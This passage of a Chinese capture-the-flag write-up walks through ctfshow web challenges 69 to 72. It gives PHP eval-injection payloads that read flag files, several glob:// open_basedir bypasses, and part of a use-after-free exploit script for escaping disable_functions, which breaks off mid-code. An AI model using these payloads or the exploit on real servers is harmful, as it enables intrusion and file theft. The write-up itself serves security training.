id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h3><p>ban了<code>var_dump</code> <code>print_r</code><br> <code>print</code>和<code>echo</code>无法打印数组<br><code>c=echo(implode(&#39;  &#39;,scandir(&#39;/&#39;)));</code>       //<code>implode</code>把数组元素组合为字符串<br><code>c=var_export(scandir(&#39;/&#39;));</code>                    //<code>var_export</code> 类似 <code>var_dump</code><br><code>c=include(&#39;/flag.txt&#39;);</code><br><code>c=require(&#39;/flag.txt&#39;);</code><br><code>c=readgzfile(&quot;/flag.txt&quot;); </code></p><h3 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br><span class="hljs-built_in">Warning</span>: error_reporting() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">14</span><br><br><span class="hljs-built_in">Warning</span>: ini_set() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">15</span><br><br><span class="hljs-built_in">Warning</span>: highlight_file() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">21</span><br>你要上天吗？ <br></code></pre></td></tr></table></figure><p><code>c=var_export(scandir(&#39;/&#39;));</code><br><code>c=echo(implode(&#39;  &#39;,scandir(&#39;/&#39;)));</code><br><code>c=include(&#39;/flag.txt&#39;);</code><br><code>c=require(&#39;/flag.txt&#39;);</code><br><code>c=readgzfile(&quot;/flag.txt&quot;); </code></p><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>  <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>  <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br>你要上天吗？<br></code></pre></td></tr></table></figure><p><code>ob_get_contents</code> — 返回输出缓冲区的内容<br><code>ob_end_clean</code> — 清空（擦除）缓冲区并关闭输出缓冲<br>截取了读flag的回显<br>数字和字母会被<code>preg_replace</code>替换为问号<br>一种解法是<code>后接exit() 或者 die()</code>结束程序，后面读取缓冲区失效<br><code>c=var_export(scandir(&#39;/&#39;));;exit();</code><br><code>c=include(&#39;/flag.txt&#39;);exit();``require</code> <code>readgzfile</code>都可以<br>另一种是直接输出缓冲区<br><code>ob_flush</code> — 冲刷出（送出）输出缓冲区中的内容<br><code>ob_end_flush</code> — 冲刷出（送出）输出缓冲区内容并关闭缓冲区<br><code>c=var_export(scandir(&#39;/&#39;));ob_flush ();</code><br><code>c=var_export(scandir(&#39;/&#39;));ob_end_flush ();</code></p><h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>源码同上题<br><code>c=var_export(scandir(&#39;/&#39;));;exit();</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">scandir</span>(): open_basedir restriction in effect. <span class="hljs-title function_ invoke__">File</span>(/) is not within the allowed <span class="hljs-title function_ invoke__">path</span>(s): (/<span class="hljs-keyword">var</span>/www/html/) in /<span class="hljs-keyword">var</span>/www/html/index.<span class="hljs-title function_ invoke__">php</span>(<span class="hljs-number">19</span>) : <span class="hljs-keyword">eval</span>()<span class="hljs-string">&#x27;d code on line 1</span><br></code></pre></td></tr></table></figure><p>读不到根目录<br><code>c=var_export(glob(&quot;*&quot;));;exit();</code> 查看当前目录<br>看到flag.php在当前目录<br><code>c=readgzfile(&#39;flag.php&#39;);exit();</code>  回显 <code>$flag=&quot;秀秀得了,这次不在这里&quot;;</code> 被骗了<br><code>open_basedir</code>是<code>php.ini</code>中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域<br>题目限制了<code>open_basedir</code>在当前目录，要查看根目录文件需要绕过<code>open_basedir</code><br><code>glob</code>伪协议在筛选目录时不受<code>open_basedir</code>制约</p><h5 id="利用-scandir-glob"><a href="#利用-scandir-glob" class="headerlink" title="利用 scandir()+glob://"></a>利用 scandir()+glob://</h5><p><code>c=var_export(scandir(&#39;glob:///*&#39;));exit();</code><br><img src="/mdimg/ctfshow77/13.png"></p><h5 id="DirectoryIterator类-glob-协议"><a href="#DirectoryIterator类-glob-协议" class="headerlink" title="DirectoryIterator类 + glob://协议"></a>DirectoryIterator类 + glob://协议</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)<br>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);<br>&#125; <br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/ctfshow77/14.png"></p><h5 id="FilesystemIterator类-glob-协议"><a href="#FilesystemIterator类-glob-协议" class="headerlink" title="FilesystemIterator类 + glob://协议"></a>FilesystemIterator类 + glob://协议</h5><p>FilesystemIterator继承自DirectoryIterator，在显示上与父类略微有区别</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-variable">$dir_array</span> = <span class="hljs-keyword">array</span>();<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&#x27;glob:///*&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$d</span>)&#123;<br>    <span class="hljs-variable">$dir_array</span>[] = <span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>();<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&#x27;glob:///.*&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$d</span>)&#123;<br>    <span class="hljs-variable">$dir_array</span>[] = <span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">sort</span>(<span class="hljs-variable">$dir_array</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir_array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$d</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>.<span class="hljs-string">&#x27; &#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">exit</span>();<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="/mdimg/ctfshow77/15.png"></p><h5 id="利用-opendir-readdir-glob"><a href="#利用-opendir-readdir-glob" class="headerlink" title="利用 opendir()+readdir()+glob://"></a>利用 opendir()+readdir()+glob://</h5><p><code>opendir</code>作用为打开目录句柄<br><code>readdir</code>作用为从目录句柄中读取目录<br>通过glob协议 <code>glob:///*</code> 循环读取并输出根目录的文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-variable">$a</span>) ) &#123;<br>    <span class="hljs-keyword">while</span> ( (<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$b</span>)) !== <span class="hljs-literal">false</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">closedir</span>(<span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>get：<code>?cmd=glob:///*</code><br><img src="/mdimg/ctfshow77/16.png"></p><h5 id="利用symlink-软链接-失败-symlink-被ban了"><a href="#利用symlink-软链接-失败-symlink-被ban了" class="headerlink" title="利用symlink() 软链接 失败  symlink()被ban了"></a>利用symlink() 软链接 失败  symlink()被ban了</h5><p><img src="/mdimg/ctfshow77/17.png"></p><h5 id="读文件-1"><a href="#读文件-1" class="headerlink" title="读文件"></a>读文件</h5><p><code>open_basedir</code>对命令执行函数没有限制，但这里 <code>disable_function</code>把<code>system</code>等都ban了<br>UAF即为Use After Free。也就是使用了已经被释放的内存，最终导致内存崩溃或任意代码被执行的漏洞。UAF漏洞常见于浏览器中，如IE、Chrome、Firefox等<br>看不懂…….uaf<br>官方uaf脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>();<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br> <br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br> <br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br> <br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <br> <br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br> <br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br> <br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br> <br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; 